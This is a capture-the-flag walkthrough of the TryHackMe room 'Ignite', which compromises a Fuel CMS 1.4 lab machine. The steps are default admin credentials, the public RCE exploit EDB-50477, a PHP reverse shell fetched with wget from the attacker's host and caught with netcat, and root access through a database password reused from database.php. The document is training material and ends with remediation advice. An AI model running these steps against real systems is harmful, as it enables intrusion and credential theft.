# Ignite

**Platform:** TryHackMe
**Category:** Challenge Room
**Difficulty:** Easy
**Status:** ✅ Solved (both flags captured)

## Background

Ignite is a freshly installed **Fuel CMS 1.4** site that was never hardened after setup — and almost every mistake on the checklist is present at once. The installer page and documentation are still public, the administrator account still uses the vendor's default credentials, the exact version is advertised on the landing page, and that version carries a well-known unauthenticated **remote code execution** vulnerability (CVE-2018-16763, via the `fuel/module/fuel/pages/select` filter parameter, which passes user input into PHP `eval`-style execution). The final escalation needs no exploit at all: the application's own database configuration file contains a root-level password that is reused for the system `root` account. The room is a compact lesson in why "install and forget" is the most common real-world failure mode for CMS deployments.

## Lab Objective

Compromise the Fuel CMS site on the target — from the default-credential admin panel and the public Exploit-DB RCE to a proper reverse shell — then use the credentials stored in the application's configuration to become root and capture both flags.

**Provided resources:** the target machine only; no credentials are given.

<img width="2977" height="940" alt="step-1" src="https://github.com/user-attachments/assets/1d1bcdb8-ebc1-46bc-83cc-82d0e40b8674" />


<img width="3155" height="1114" alt="step-2" src="https://github.com/user-attachments/assets/dd7b035a-12fc-4cb0-981d-40f658ab6dfd" />


## Walkthrough

### Step 1: Scan the Target

A quick Nmap scan shows a single useful service: **port 80 (HTTP)** is open. Everything in this room happens through the website.

<img width="2327" height="1006" alt="step-3" src="https://github.com/user-attachments/assets/595c2704-9f78-45d8-b0ff-d998a75ddc62" />


### Step 2: Identify the CMS and Its Version

Browsing to the target shows the default welcome page of **Fuel CMS, Version 1.4** — a PHP/MySQL content management system. A landing page that announces the product and exact version is free reconnaissance: it goes straight into a vulnerability search.

<img width="2860" height="1508" alt="step-4" src="https://github.com/user-attachments/assets/d531f8f9-3028-45e8-9842-8670d91301b3" />


### Step 3: Check for Known Exploits

Search the local exploit archive for the product:

```bash
searchsploit fuel cms
```

Several entries come back, including a Ruby (Metasploit-style) one — but checking Metasploit itself shows there is **no module for this vulnerability in the framework**. That rules out the one-command route for the moment; the manual Exploit-DB path will be needed later.

<img width="2777" height="1072" alt="step-5" src="https://github.com/user-attachments/assets/c8440886-ca2f-477f-98ef-74335f68ef07" />


<img width="2368" height="355" alt="step-6" src="https://github.com/user-attachments/assets/84901338-f5f5-46eb-9bf4-3e1ef01d3ec5" />


### Step 4: Log In with the Default Credentials from the Documentation

The site's own **documentation page** is still publicly reachable, and it openly prints the default administrator credentials — the pair Fuel CMS ships with, `admin` / `admin`. It also links to the admin login page.

Try them at the login page. They work on the first attempt: full access to the CMS admin dashboard. The stack behind it is PHP with a MySQL database, as the dashboard's environment information confirms. Nothing so far required an exploit — only reading what the site itself published.

<img width="2708" height="1336" alt="step-7" src="https://github.com/user-attachments/assets/e01856eb-93a4-4a6a-83b9-0b4d158859c0" />

<img width="2793" height="1372" alt="step-8" src="https://github.com/user-attachments/assets/bfab4439-ac42-489f-8ebc-1802a72667ea" />
<img width="2832" height="1157" alt="step-9" src="https://github.com/user-attachments/assets/cd1ee23a-f6d7-4218-a60b-4e4ebf712b09" />

<img width="2776" height="460" alt="step-10" src="https://github.com/user-attachments/assets/32afc410-1313-47df-9794-73c340b5f314" />


The documentation keeps giving: it exposes further internal links and installation details (an information-disclosure issue in its own right), which are worth a quick look before moving on.

<img width="2844" height="723" alt="step-11" src="https://github.com/user-attachments/assets/adc6d737-c579-47f2-b4c7-78de94eea3c4" />


### Step 5: Explore the Admin Panel

Inside the dashboard, the **Assets** section offers file-upload functionality, and other sections accept content as well — promising territory for getting code onto the server. Rather than fight the panel's upload restrictions by hand, go back to the version-specific vulnerability research: the public exploit for this exact build is the reliable path.

<img width="2777" height="1080" alt="step-12" src="https://github.com/user-attachments/assets/4f50c68f-9e6c-47d4-81f2-33914e1af562" />


### Step 6: Run the Public RCE Exploit (Exploit-DB 50477)

Search Exploit-DB for the 1.4 line of Fuel CMS and pick the third result — the Python remote code execution exploit, **EDB-ID 50477** — and download it.

<img width="3505" height="1384" alt="step-13" src="https://github.com/user-attachments/assets/aeb7ca0a-4064-4cae-ba6b-3a864d788c60" />

<img width="3160" height="1647" alt="step-14" src="https://github.com/user-attachments/assets/4ad83235-5e60-48b1-ae79-bdf5c28f768e" />


Run it against the target:

```bash
python3 50477.py -u http://10.49.147.112
```

It connects and drops into its simple command prompt — arbitrary commands now execute on the server as the web user. That is unauthenticated RCE: no admin login was even required for this step, the vulnerable version alone was enough.

<img width="1774" height="592" alt="step-15" src="https://github.com/user-attachments/assets/5255446b-0ff6-4e3f-b627-6b36ad3d71b9" />


### Step 7: Upgrade to a Proper Reverse Shell and Take the First Flag

The exploit's prompt is fine for single commands but poor for real work, so upgrade it into a full reverse shell:

1. Download the classic PHP reverse shell script and edit in the Kali machine's IP and chosen port.

<img width="2606" height="1410" alt="step-16" src="https://github.com/user-attachments/assets/c07bbfa5-ecc3-4ff3-80e3-53dc6ac682f7" />


<img width="1576" height="974" alt="step-17" src="https://github.com/user-attachments/assets/d7a50ef6-0fe4-45d3-bd27-d4ed117780a6" />


2. Serve the folder containing the shell from Kali with a simple HTTP server, so the target can fetch it:

```bash
python3 -m http.server 8000
```

<img width="1951" height="537" alt="step-18" src="https://github.com/user-attachments/assets/e8c1d80e-b12c-4872-95e9-528d852bee34" />


3. Start a Netcat listener on the chosen port:

```bash
nc -nlvp 4444
```

<img width="1644" height="538" alt="step-19" src="https://github.com/user-attachments/assets/8749dc45-4530-4d22-83c3-b535b9a885bc" />


4. Through the exploit's command prompt, have the target download the PHP shell into the web directory:

```bash
wget http://<kali-ip>:8000/shell.php
```

<img width="2212" height="1519" alt="step-20" src="https://github.com/user-attachments/assets/baeb20d6-950b-42fe-b8dc-3ccffb11bc5d" />


5. Browse to the uploaded file's URL to trigger it.

<img width="2125" height="360" alt="step-21" src="https://github.com/user-attachments/assets/4f83796a-5fe1-4090-97bc-e2dcf35e98e1" />


The listener catches the connection — a real shell as the web user. Stabilise it into a fully interactive terminal with the standard Python PTY trick:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="2749" height="1068" alt="step-22" src="https://github.com/user-attachments/assets/b5909193-1117-4b33-ac25-e2d6434c0ecf" />

<img width="2054" height="187" alt="step-23" src="https://github.com/user-attachments/assets/ea157913-da18-4dff-85af-e65008d252d0" />


Exploring from the shell, the **first flag** is readable in the web user's area.

<img width="2232" height="1101" alt="step-24" src="https://github.com/user-attachments/assets/0038277e-c584-4f3b-8cfa-418bcd892bda" />


### Step 8: Root — the Database Configuration Hands Over the Keys

The second flag sits in `/root`, and the web user cannot read it — some privilege escalation is needed. Before reaching for kernel exploits or SUID hunting, backtrack: the site's default landing page itself states that the hostname, username and password live in the application's database configuration file, at `fuel/application/config/database.php`.

<img width="1793" height="239" alt="step-25" src="https://github.com/user-attachments/assets/f6e76dc7-b413-411c-9802-218cc0a1cc65" />


<img width="2270" height="580" alt="step-26" src="https://github.com/user-attachments/assets/a221dae5-78d2-416c-b5fc-da644101805c" />


A file the web server can read is a file the web shell can read. Display it:

```bash
cat /var/www/html/fuel/application/config/database.php
```

<img width="2792" height="474" alt="step-27" src="https://github.com/user-attachments/assets/f838ba30-f44f-47e5-b8c9-f76b5eb7455a" />


The configuration contains exactly what was promised — including a **root** credential (the value is visible in the screenshot and is not repeated here).

<img width="1616" height="883" alt="step-28" src="https://github.com/user-attachments/assets/b4cc7962-a51d-4a32-8be1-5ae995ef2e76" />


The decisive question is whether that password was reused for the operating system's root account. It was:

```bash
su root
```

<img width="1471" height="424" alt="step-29" src="https://github.com/user-attachments/assets/ab925d74-8e05-4e93-88d1-0f89434e6c78" />


As root, read the second flag from `/root` — room complete.

<img width="2759" height="1109" alt="step-30" src="https://github.com/user-attachments/assets/2f42d918-0e2a-4f68-8902-86896293acb3" />


## Key Takeaways

- A default CMS installation fails at every layer simultaneously: version disclosure on the landing page, public documentation and installer leftovers, and default credentials printed in that documentation. Any one of them is a finding; together they are a full compromise path.
- Version numbers are exploit selectors. The moment "Fuel CMS 1.4" was identified, `searchsploit` and Exploit-DB turned it into a working unauthenticated RCE (50477) — no Metasploit module required.
- A basic exploit prompt is a foothold, not a shell: serving a real reverse shell over HTTP, catching it with a listener, and upgrading it with a PTY is the standard workflow that turns one-command execution into comfortable post-exploitation.
- Configuration files are credential stores. `database.php` held a root-grade password, and it was reused for the system root account — the most damaging form of password reuse, because one web-readable file became full host compromise.

## Remediation

Remove installer and documentation pages from production sites, change all default credentials before a CMS goes live, and suppress version banners where possible. Keep the CMS patched — the 1.4 line's RCE is fixed in later releases — and restrict the admin panel by IP allow-list or additional authentication. Run the web application with a database account that has only the privileges the application needs, never root, and store its credentials outside the web root with tight file permissions. Above all, never reuse database or application passwords for operating-system accounts: a configuration disclosure should cost an application, not the whole machine.
